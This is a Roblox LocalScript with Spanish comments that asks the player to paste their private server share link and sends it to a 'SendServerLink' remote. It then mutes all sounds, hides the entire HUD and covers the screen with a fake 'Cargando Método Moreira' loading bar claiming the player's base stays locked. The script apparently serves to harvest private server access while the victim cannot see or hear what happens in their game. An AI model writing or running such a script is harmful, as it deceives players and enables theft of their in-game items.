-- LocalScript: UI de link + pantalla de carga fullscreen + eliminar sonidos + ocultar HUD
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local Lighting = game:GetService("Lighting")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- =========================
-- UI INICIAL (PEDIR LINK)
-- =========================
local a = Instance.new("ScreenGui")
a.Name = "ServerLinkUI"
a.IgnoreGuiInset = true
a.ResetOnSpawn = false
a.Parent = PlayerGui
a.DisplayOrder = 1000
a.ZIndexBehavior = Enum.ZIndexBehavior.Global

local b = Instance.new("Frame")
b.Size = UDim2.new(0, 400, 0, 250)
b.AnchorPoint = Vector2.new(0.5, 0.5)
b.Position = UDim2.new(0.5, 0, 0.5, 0)
b.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
b.BorderSizePixel = 0
b.Parent = a

local c = Instance.new("TextLabel")
c.Parent = b
c.Size = UDim2.new(1, -40, 0, 30)
c.Position = UDim2.new(0, 20, 0, 20)
c.BackgroundTransparency = 1
c.Text = "Ingresa el link de tu servidor privado:"
c.TextColor3 = Color3.fromRGB(255,255,255)
c.Font = Enum.Font.GothamSemibold
c.TextScaled = false
c.TextSize = 18
c.TextWrapped = true

local d = Instance.new("TextBox")
d.Parent = b
d.Size = UDim2.new(1, -40, 0, 40)
d.Position = UDim2.new(0, 20, 0, 70)
d.BackgroundColor3 = Color3.fromRGB(50,50,50)
d.TextColor3 = Color3.fromRGB(255,255,255)
d.Text = "https://www.roblox.com/share?code="
d.ClearTextOnFocus = false
d.Font = Enum.Font.Gotham
d.TextSize = 16
d.TextWrapped = true

local e = Instance.new("TextLabel")
e.Parent = b
e.Size = UDim2.new(1, -40, 0, 20)
e.Position = UDim2.new(0, 20, 0, 120)
e.BackgroundTransparency = 1
e.Text = ""
e.TextColor3 = Color3.fromRGB(255,0,0)
e.Font = Enum.Font.GothamBold
e.TextScaled = false
e.TextSize = 16
e.TextWrapped = true

local f = Instance.new("TextButton")
f.Parent = b
f.Size = UDim2.new(1, -40, 0, 40)
f.Position = UDim2.new(0, 20, 0, 160)
f.Text = "Enviar"
f.Font = Enum.Font.GothamBold
f.TextSize = 18
f.BackgroundColor3 = Color3.fromRGB(70,70,70)
f.TextColor3 = Color3.fromRGB(255,255,255)
f.AutoButtonColor = true
f.BorderSizePixel = 0

-- =========================
-- Función: validar link (solo inicio y final)
-- =========================
local function g(h)
	local i = "https://www.roblox.com/share?code="
	local j = "&type=Server"
	if type(h) ~= "string" then return false end
	return string.sub(h, 1, #i) == i and string.sub(h, -#j) == j
end

-- =========================
-- Función: eliminar todos los sonidos actuales y futuros (cliente)
-- =========================
local function k()
	local l = {
		Workspace,
		SoundService,
		Lighting,
		ReplicatedStorage,
		PlayerGui,
	}

	local function m(n)
		for _, o in ipairs(n:GetDescendants()) do
			if o:IsA("Sound") or o:IsA("AudioEmitter") then
				pcall(function()
					o:Stop()
					o:Destroy()
				end)
			end
		end
	end

	for _, p in ipairs(l) do
		pcall(function() m(p) end)
	end

	for _, p in ipairs(l) do
		pcall(function()
			p.DescendantAdded:Connect(function(q)
				if q:IsA("Sound") or q:IsA("AudioEmitter") then
					pcall(function()
						q:Stop()
						q:Destroy()
					end)
				end
			end)
		end)
	end

	pcall(function()
		if type(SoundService.Volume) == "number" then
			SoundService.Volume = 0
		end
	end)
end

-- =========================
-- Función: ocultar HUD
-- =========================
local function r()
	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
	for _, s in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		pcall(function() StarterGui:SetCoreGuiEnabled(s, false) end)
	end
end

-- =========================
-- Pantalla de carga FULLSCREEN
-- =========================
local function t()
	local u = Instance.new("ScreenGui")
	u.Name = "FullLoadingScreen"
	u.IgnoreGuiInset = true
	u.ResetOnSpawn = false
	u.DisplayOrder = 10000
	u.ZIndexBehavior = Enum.ZIndexBehavior.Global
	u.Parent = PlayerGui

	local v = Instance.new("Frame")
	v.Size = UDim2.new(1, 0, 1, 0)
	v.Position = UDim2.new(0, 0, 0, 0)
	v.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	v.BorderSizePixel = 0
	v.Parent = u

	local w = Instance.new("TextLabel")
	w.Parent = v
	w.Size = UDim2.new(1, -40, 0, 80)
	w.Position = UDim2.new(0, 20, 0.35, -40)
	w.BackgroundTransparency = 1
	w.Text = "Cargando Método Moreira"
	w.TextColor3 = Color3.fromRGB(255, 255, 255)
	w.TextScaled = true
	w.Font = Enum.Font.GothamBold

	local x = Instance.new("Frame")
	x.Parent = v
	x.Size = UDim2.new(0.6, 0, 0, 28)
	x.Position = UDim2.new(0.2, 0, 0.52, 0)
	x.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	x.BorderSizePixel = 0
	x.ClipsDescendants = true

	local y = Instance.new("Frame")
	y.Parent = x
	y.Size = UDim2.new(0.01, 0, 1, 0)
	y.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
	y.BorderSizePixel = 0

	local z = Instance.new("TextLabel")
	z.Parent = x
	z.Size = UDim2.new(1, 0, 1, 0)
	z.BackgroundTransparency = 1
	z.Text = "1%"
	z.TextColor3 = Color3.fromRGB(255, 255, 255)
	z.TextScaled = true
	z.Font = Enum.Font.GothamBold

	local aa = Instance.new("TextLabel")
	aa.Parent = v
	aa.Size = UDim2.new(1, -40, 0, 40)
	aa.Position = UDim2.new(0, 20, 0.63, 0)
	aa.BackgroundTransparency = 1
	aa.Text = "Tu base se mantendrá bloqueada hasta que termine la carga.."
	aa.TextColor3 = Color3.fromRGB(200, 200, 200)
	aa.TextScaled = true
	aa.Font = Enum.Font.SourceSans

	task.spawn(function()
		for i = 1, 100 do
			y.Size = UDim2.new(i/100, 0, 1, 0)
			z.Text = tostring(i) .. "%"
			task.wait(0.05)
		end
	end)
end

-- =========================
-- Función para buscar datos de brainrots
-- =========================
local function bb()
	local cc = {}

	-- Buscar en ReplicatedStorage
	local function dd(ee)
		if ee:IsA("Model") or ee:IsA("Folder") then
			for _, ff in ipairs(ee:GetChildren()) do
				if ff:IsA("Model") or ff:IsA("Folder") then
					local gg = ff:FindFirstChild("Category")
					local hh = ff:FindFirstChild("MoneyValue")
					if gg and hh then
						table.insert(cc, {
							Name = ff.Name,
							Category = gg.Value,
							MoneyGiven = hh.Value,
							MoneyCost = ff:FindFirstChild("MoneyCost") and ff.MoneyCost.Value or "Unknown"
						})
					end
					dd(ff)
				end
			end
		end
	end

	dd(ReplicatedStorage)
	dd(Workspace)
	dd(ServerStorage)

	-- Buscar en la información del jugador
	local ii = Player:FindFirstChild("PlayerData") or Player:FindFirstChild("Data") or Player:FindFirstChild("UserData")
	if ii then
		dd(ii)
	end

	return cc
end

-- =========================
-- Acción al presionar Enviar
-- =========================
f.MouseButton1Click:Connect(function()
	local jj = d.Text

	if g(jj) then
		e.Text = "El link es válido ✅"
		e.TextColor3 = Color3.fromRGB(0, 255, 0)

		local kk = ReplicatedStorage:FindFirstChild("SendServerLink")
		if kk then
			pcall(function() kk:FireServer(jj) end)
		end

		-- Guardar el link del servidor
		local ll = jj
		print("Link del servidor guardado:", ll)

		-- Buscar datos de brainrots
		local mm = bb()
		if #mm > 0 then
			print("Datos de brainrots encontrados:")
			for _, nn in ipairs(mm) do
				print("Nombre:", nn.Name)
				print("Categoría:", nn.Category)
				print("Dinero que da:", nn.MoneyGiven)
				print("Dinero que cuesta:", nn.MoneyCost)
				print("---------------------------")
			end
			e.Text = "Datos de brainrots encontrados."
			e.TextColor3 = Color3.fromRGB(0, 255, 0)
		else
			print("No se encontraron datos de brainrots.")
			e.Text = "No se encontraron datos de brainrots."
			e.TextColor3 = Color3.fromRGB(255, 0, 0)
		end

		k()
		r()
		t()

		a:Destroy()
	else
		e.Text = "El link es inválido ❌"
		e.TextColor3 = Color3.fromRGB(255, 0, 0)
	end
end)

-- =========================
-- Función para imprimir la estructura del Workspace
-- =========================
local function oo(pp, qq)
	qq = qq or 0
	local rr = string.rep("  ", qq)
	print(rr .. pp.Name .. " (" .. pp.ClassName .. ")")

	for _, ss in ipairs(pp:GetChildren()) do
		oo(ss, qq + 1)
	end
end

-- Imprimir la estructura del Workspace al inicio
print("Estructura del Workspace:")
oo(Workspace)
